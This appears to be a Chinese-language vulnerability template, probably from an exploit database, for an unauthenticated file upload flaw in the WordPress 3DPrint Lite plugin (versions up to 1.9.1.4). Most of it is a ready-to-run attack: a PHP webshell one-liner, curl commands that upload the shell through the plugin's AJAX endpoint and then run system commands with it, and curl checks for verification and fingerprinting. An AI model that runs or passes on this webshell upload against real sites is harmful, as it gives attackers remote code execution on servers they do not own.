---
id: WP-3DPRINT-UPLOAD
title: WordPress 3DPrint Lite 插件未授权文件上传漏洞
product: wordpress
vendor: WordPress
version_affected: "3DPrint Lite <= 1.9.1.4"
severity: CRITICAL
tags: [rce, file_upload, 无需认证]
fingerprint: ["WordPress", "3dprint-lite"]
---

## 漏洞描述

WordPress 3DPrint Lite 插件 1.9.1.4 及以前版本的 `p3dlite_handle_upload` 函数通过 `wp_ajax_nopriv` 注册为无需认证的 AJAX 动作，攻击者可未授权上传任意文件（包括 PHP webshell）到 `/wp-content/uploads/p3d/` 目录。

## 影响版本

- WordPress 3DPrint Lite <= 1.9.1.4

## 前置条件

- 无需认证
- 3DPrint Lite 插件已安装

## 利用步骤

1. 向 `/wp-admin/admin-ajax.php?action=p3dlite_handle_upload` 发送文件上传请求
2. PHP 文件上传至 `/wp-content/uploads/p3d/`
3. 访问上传的 webshell 执行命令

## Payload

### 上传 webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s "http://target/wp-admin/admin-ajax.php?action=p3dlite_handle_upload" \
  -F "file=@/tmp/shell.php;filename=cmd.php"
```

### 执行命令

```bash
curl -s "http://target/wp-content/uploads/p3d/cmd.php?cmd=id"
```

## 验证方法

```bash
# 检查接口是否可访问
curl -s "http://target/wp-admin/admin-ajax.php?action=p3dlite_handle_upload" | grep "jsonrpc"
# 返回包含 jsonrpc 字段表示接口存在

# 上传后验证
curl -s "http://target/wp-content/uploads/p3d/cmd.php?cmd=id" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/wp-content/plugins/3dprint-lite/readme.txt" | head -5
```
